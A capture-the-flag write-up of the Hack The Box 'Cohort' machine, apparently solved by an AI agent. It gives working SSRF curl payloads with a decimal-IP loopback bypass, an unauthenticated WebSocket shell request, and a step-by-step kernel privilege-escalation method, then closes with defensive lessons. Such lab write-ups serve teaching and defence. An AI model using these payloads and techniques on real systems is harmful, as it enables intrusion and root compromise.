---
layout: post
title:  "Hack The Box - Cohort"
description: A Hack The Box Linux Boot2Root Challenge - by Username
tags: HackTheBox Linux Boot2Root
media_subpath: /assets/img/writeups/Hack The Box/Cohort/
image:
  path: /assets/img/writeups/Hack The Box/Cohort/cohort_solved.png
  alt: Cohort machine completion banner showing user and root flags
  width: 890
  height: 308
---

## At a glance

| Item                | Details                                                       |
| ------------------- | ------------------------------------------------------------- |
| **Type**            | Boot2Root                                                     |
| **Host**            | `cohort.htb` (Cohort Analytics)                               |
| **Platform**        | Hack The Box                                                  |
| **Entry vector**    | SSRF in the source-validation API, then an unauthenticated WebSocket PTY |
| **Privilege escalation** | VsockDrop page-refcount underflow (CVE-2026-53365)       |

*This machine was solved autonomously by the Username AI agent.*

*The flags recorded below were read from the current reset instance `10.129.76.96`. Earlier sessions on a previous instance of the same box produced different flag values, so only the reset-instance values are published here.*

## Summary

The public site is a single-page marketing bundle for "Cohort Analytics". Deobfuscating the bundle shows the page posts a source URL to `/api/validate`, and the backend fetches that URL server-side — a textbook SSRF. The validator's loopback filter is bypassed with the decimal form of `127.0.0.1`, which lets an attacker read the internal service map: the `cohort-insights` API on `:5000` and a **marimo 0.20.4** notebook server on `:8888`.

The internal nginx `/status` endpoint then discloses the `cohort-edge` upstream list, including a `notebooks` virtual host, `nb-1be3782a8afd3ad5.cohort.htb`, which proxies to `127.0.0.1:8888`. That vhost is reachable from the outside with a plain `Host` header, and marimo 0.20.4 exposes `/terminal/ws` — a WebSocket endpoint that skips authentication and forks a PTY (**CVE-2026-39987**, fixed in 0.23.0). The upgrade succeeds with `HTTP/1.1 101 Switching Protocols` and hands over a shell as the `marimo` user, which is where the user flag lives.

The marimo account has no sudo, no setuid helpers worth abusing, and the box author deliberately neutralised the usual kernel-LPE families. The remaining path is the kernel itself: `io_uring` is enabled, `/dev/vsock` is world-writable, and the vsock modules are loaded — the exact prerequisites for **VsockDrop (CVE-2026-53365)**. The exploit underflows the managed-fragment refcount of a pinned `io_uring` buffer through the vsock zerocopy `SEND_ZC` path, so that a freed physical frame is re-served as the page-cache page backing `/usr/bin/su`. Rewriting `su`'s `.interp` string to a local stub turns the next `su` execution into an attacker-controlled interpreter run with root privileges.

## 1. External enumeration

```bash
nmap --privileged -sS -Pn -p- --min-rate 3000 -T4 10.129.76.38
```

```text
Nmap scan report for 10.129.76.38
Host is up (0.017s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Service detection on 443:

```text
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
```

## 2. The SPA and the SSRF validator

The site root serves an obfuscated JavaScript bundle. Decoding the string table yields the real form handler:

```javascript
fetch("/api/validate", {
  method: "POST",
  headers: { "Content-Type": "application/json", "Accept": "application/json" },
  body: JSON.stringify({ url: url, format: document.getElementById("format").value })
})
```

The backend is `cohort-insights` (`/opt/cohort-insights/insights_api.py`, running as the unprivileged `insights` user). It performs a server-side `GET` of the supplied URL and returns the status code, content type, and a preview of the body.

### Bypassing the loopback filter

The validator rejects `127.0.0.1`, `0.0.0.0`, `127.1`, hex `0x7f000001` and octal `0177.0.0.1`, but accepts the **decimal** encoding `2130706433`:

```bash
curl -sk -X POST --resolve cohort.htb:443:10.129.76.38 \
  https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:8888/api/version","format":"json"}'
```

```json
{
  "ok": true,
  "fetched_status": 200,
  "content_type": "text/plain",
  "preview": "0.20.4"
}
```

Only `http`/`https` are accepted and the fetch is GET-only, but that is enough to sweep the internal ports. The scan found the validator itself on `:5000` and the marimo notebook server on `:8888`:

![SSRF internal service map recovered through POST /api/validate](01-ssrf-service-map.png)

## 3. Discovering the notebook virtual host

The internal nginx exposes a `/status` page (403 from the public vhost) that discloses the edge configuration:

```bash
curl -sk -X POST --resolve cohort.htb:443:10.129.76.38 \
  https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433/status","format":"json"}'
```

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    { "name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort" },
    { "name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000" },
    { "name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888" }
  ]
}
```

The `notebooks` virtual host is not a hidden name — it is a normal public vhost, so a single `Host` header reaches marimo directly:

```bash
curl -sk --resolve nb-1be3782a8afd3ad5.cohort.htb:443:10.129.76.38 \
  https://nb-1be3782a8afd3ad5.cohort.htb/api/version
```

```text
0.20.4
```

## 4. Foothold — unauthenticated WebSocket PTY (CVE-2026-39987)

marimo 0.20.4's `/terminal/ws` endpoint does not enforce the notebook's auth token and forks a PTY for the `marimo` service account. A plain WebSocket upgrade reaches it:

```text
GET /terminal/ws HTTP/1.1
Host: nb-1be3782a8afd3ad5.cohort.htb
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <key>
Sec-WebSocket-Version: 13
```

```text
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Connection: upgrade
Upgrade: websocket
```

The frame that comes back is an interactive shell:

![Unauthenticated WebSocket upgrade yielding a marimo PTY](02-websocket-pty-shell.png)

```text
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

## 5. User flag

The notebook user's home directory holds the flag file:

```bash
id; cat /home/marimo/user.txt; wc -c /home/marimo/user.txt
```

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
bde3cc6fe041bfc02890b88fd189c362
33 /home/marimo/user.txt
```

![User flag read from the marimo shell](05-user-flag.png)

**User flag: `bde3cc6fe041bfc02890b88fd189c362`**

## 6. Privilege escalation — VsockDrop (CVE-2026-53365)

### Why the usual paths fail

The `marimo` account is not in `sudoers` (`sudo -n -v` → "Sorry, user marimo may not run sudo"), there are no writable `sudoers.d` fragments, no SUID binaries beyond stock, no file capabilities, and unprivileged user namespaces are disabled (`unshare -U` → `EPERM`). The box author additionally blacklisted the popular kernel-module families through `/etc/modprobe.d/disable-*.conf`, which closes Copy Fail, DirtyFrag, and the related `userns` escalations. Every application-level avenue — Sysmon, Laurel, VGAuth, apport, sysstat timers — was checked and ruled out by evidence.

That leaves the kernel surface itself. The VsockDrop prerequisites are all present on this host:

![VsockDrop prerequisites: kernel version, io_uring enabled, world-writable /dev/vsock](03-vsockdrop-prerequisites.png)

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
6.8.0-136-generic
io_uring_disabled=0
crw-rw-rw- 1 root root 10, 262 Nov 14 08:39 /dev/vsock
vsock_mods=5
```

### The primitive

`io_uring` can pin a userspace buffer with `FOLL_LONGTERM`, which adds a large bias to the page refcounts. The vsock `SEND_ZC` zerocopy path then calls `put_page()` on the managed fragments one extra time, underflowing those refcounts. After enough iterations the bias reaches zero and the pinned pages are released to the per-CPU free list — while the exploit still holds an alias to them.

The exploit therefore:

1. Registers a 192 KB buffer with `io_uring` and pins it, then `munmap`s it so the pin is the only remaining reference.
2. Drives the vsock zerocopy send in lockstep — one send fully drained and acknowledged before the next — so each iteration produces exactly one underflow.
3. After the bias hits zero, performs a **single cold read** of page 0 of `/usr/bin/su`, which pulls one of the freed physical frames back as the binary's page-cache page.
4. Rewrites the `.interp` string inside that aliased page to `/tmp/loader`, the attacker's interpreter stub.
5. Execs `su`; the kernel loads the hijacked `.interp` and runs the stub **as root**.

The stub does not spawn a shell directly — doing so while the bug-freed pages are still pinned would fault. It only flips a pre-staged setuid helper, and the parent process (clean, no pins held) execs that helper for the real privileged execution.

### Why the reclaim variant mattered

An earlier build used a "sacrificial page" reclaim strategy that allocated a competing page after every send. On this kernel its tag byte wraps at iteration 1023 (`0x01 + (1023 & 0xFF) == 0x00`), so the recovery step unmaps the wrong page and `su` never reclaims the freed frame:

```text
DIG aa=47 elf=-1 at send 1023
no elf page
no root
```

The working build uses the original clean reclaim — full drain, then one cold read with no competing allocation — plus one hardening tweak: `/usr/bin/su` is **pre-opened before the loop** so the post-free reclaim window contains no `open()`/path-lookup slab allocations that could steal the freed frame.

### Before firing

The exploit modifies a system binary, so a byte-exact backup is staged first:

```text
-rwsr-xr-x 1 root root 55680 Mar  6  2026 /usr/bin/su
-rwxr-xr-x 1 marimo marimo 55680 Nov 14 08:45 /tmp/su.bak
c74311fe5636b7d7f9a56239fa8adeeab12ba86fe7d41b91afa85bf9bbdae78b  /usr/bin/su
c74311fe5636b7d7f9a56239fa8adeeab12ba86fe7d41b91afa85bf9bbdae78b  /tmp/su.bak
```

The binary is transferred as a pre-encoded gzip+base64 blob over the WebSocket PTY. Because the PTY line discipline is in canonical mode with a ~4 KB line buffer, a single large line is silently truncated; the transfer therefore disables echo, writes one chunk per line under 2 KB, and drains frames continuously.

Running the exploit returns success and the stub writes its proof to a file rather than opening a shell:

```text
marimo@cohort:~$ /tmp/x2 1024 2>&1; echo "---exploit_rc=$?---"
---exploit_rc=0---
```

## 7. Root proof and restoration

```text
marimo@cohort:~$ cat /tmp/proof.txt
uid=0(root) gid=0(root) groups=0(root),1000(marimo)
===ROOTFLAG===
c7a8f0ebfb9c43319fef4db013e92314
```

The stub also restores `/usr/bin/su` from the staged backup and removes its own helper files:

```text
marimo@cohort:~$ ls -l /usr/bin/su; sha256sum /usr/bin/su /tmp/su.bak
-rwsr-xr-x 1 root root 55680 Nov 14 08:58 /usr/bin/su
c74311fe5636b7d7f9a56239fa8adeeab12ba86fe7d41b91afa85bf9bbdae78b  /usr/bin/su
c74311fe5636b7d7f9a56239fa8adeeab12ba86fe7d41b91afa85bf9bbdae78b  /tmp/su.bak

marimo@cohort:~$ ls -l /var/tmp/.s /tmp/loader
ls: cannot access '/var/tmp/.s': No such file or directory
ls: cannot access '/tmp/loader': No such file or directory
```

![Root identity proof, root flag, and the restored /usr/bin/su](04-root-proof-restoration.png)

**Root flag: `c7a8f0ebfb9c43319fef4db013e92314`**

The working directory was cleaned afterwards; only the proof file and the harmless `su` backup remain.

![Hack The Box completion banner for Cohort](cohort_solved.png)
_Verification: the machine was fully solved — both flags byte-verified on the reset instance, `/usr/bin/su` restored to its original bytes, and the completion banner confirmed._

## Security lessons

- **Fix the marimo version.** marimo 0.20.4 exposes `/terminal/ws` without authentication, and that endpoint alone is a full remote shell. Upgrade past 0.23.0 (CVE-2026-39987 is in CISA KEV) and make sure the terminal WebSocket route cannot bypass the notebook auth token.
- **An SSRF validator is a network scanner.** `POST /api/validate` fetches any attacker-supplied URL, and decimal/hex/octal loopback encodings defeat naive string filters. Apply the blocklist *after* canonicalising the address, and refuse to return response bodies.
- **Do not leak the edge configuration.** The internal `/status` page disclosed the full upstream and virtual-host table, turning a GET-only SSRF into a direct, unauthenticated path to an internal service.
- **Kernel surface is the last line of defence.** `io_uring` enabled, a world-writable `/dev/vsock`, and a 6.8 kernel gave an unprivileged user a refcount underflow that became root. Disable `io_uring` for unprivileged workloads (`kernel.io_uring_disabled=1`) and tighten `/dev/vsock` permissions where the host is not a VMware guest.
- **Design exploits to be reversible.** The `.interp` hijack mutates a system binary; staging a byte-exact backup and restoring it inside the privileged stub keeps the machine unmodified apart from the intended proof.
